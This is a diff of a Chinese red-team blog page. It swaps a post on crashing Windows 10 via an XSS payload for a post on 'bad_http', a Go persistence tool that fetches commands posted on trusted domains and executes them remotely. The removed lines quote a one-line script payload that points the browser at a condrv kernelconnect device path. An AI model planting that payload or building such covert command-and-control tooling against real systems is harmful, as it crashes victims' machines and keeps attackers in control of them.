@@ -2,21 +2,20 @@
   <head>
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>利用XSS使Win10机器蓝屏 | rebootORZ</title>
+<title>bad_http | rebootORZ</title>
 <link rel="shortcut icon" href="https://rebootorz.github.io/favicon.ico?v=1613626061770">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://rebootorz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="利用XSS使Win10机器蓝屏 | rebootORZ - Atom Feed" href="https://rebootorz.github.io/atom.xml">
+<link rel="alternate" type="application/atom+xml" title="bad_http | rebootORZ - Atom Feed" href="https://rebootorz.github.io/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
 
-    <meta name="description" content="Payload
-在谷歌浏览器触发：
-&lt;script&gt;document.location = '\\\\.\\globalroot\\device\\condrv\\kernelconnect';&lt;/script&gt;
-
-..." />
-    <meta name="keywords" content="红队" />
+    <meta name="description" content="项目地址：
+https://github.com/rebootORZ/bad_http
+介绍
+使用go实现的小工具，可以用来做权限维持，思路来源于之前在网上看到过别人说APT组织利用推特、微博等进行权限维持/上线，所以想到将执行等命令发布在..." />
+    <meta name="keywords" content="Golang,红队" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
     <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
   </head>
@@ -84,15 +83,19 @@
         <div class="post-detail">
           <article class="post">
             <h2 class="post-title">
-              利用XSS使Win10机器蓝屏
+              bad_http
             </h2>
             <div class="post-info">
               <span>
-                2021-01-19
+                2021-02-18
               </span>
               <span>
                 1 min read
               </span>
+              
+                <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="post-tag">
+                  # Golang
+                </a>
               
                 <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="post-tag">
                   # 红队
@@ -102,16 +105,18 @@
             
             <div class="post-content-wrapper">
               <div class="post-content">
-                <h1 id="payload">Payload</h1>
-<p>在谷歌浏览器触发：</p>
-<pre><code>&lt;script&gt;document.location = '\\\\.\\globalroot\\device\\condrv\\kernelconnect';&lt;/script&gt;
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://rebootorz.github.io/post-images/1611025908007.png" alt="" loading="lazy"></figure>
+                <h1 id="项目地址">项目地址：</h1>
+<p>https://github.com/rebootORZ/bad_http</p>
+<h1 id="介绍">介绍</h1>
+<p>使用go实现的小工具，可以用来做权限维持，思路来源于之前在网上看到过别人说APT组织利用推特、微博等进行权限维持/上线，所以想到将执行等命令发布在可信的域名下，然后通过远程加载来执行，当然我测试的时候是在自己的VPS上，所以如果需要放到其他地方，可能需要修改下代码，主要是命令怎么匹配的问题。<br>
+效果如下：<br>
+<img src="https://rebootorz.github.io/post-images/1613626043055.png" alt="" loading="lazy"></p>
 
               </div>
               <div class="toc-container">
                 <ul class="markdownIt-TOC">
-<li><a href="#payload">Payload</a></li>
+<li><a href="#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80">项目地址：</a></li>
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
 </ul>
 
               </div>
@@ -122,9 +127,9 @@
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://rebootorz.github.io/LSzteQmAT/">
+            <a href="https://rebootorz.github.io/KOr_G-E7u/">
               <h3 class="post-title">
-                MAC&amp;KALI进行WiFi破解
+                公网MSF shell进行内网攻击
               </h3>
             </a>
           </div>
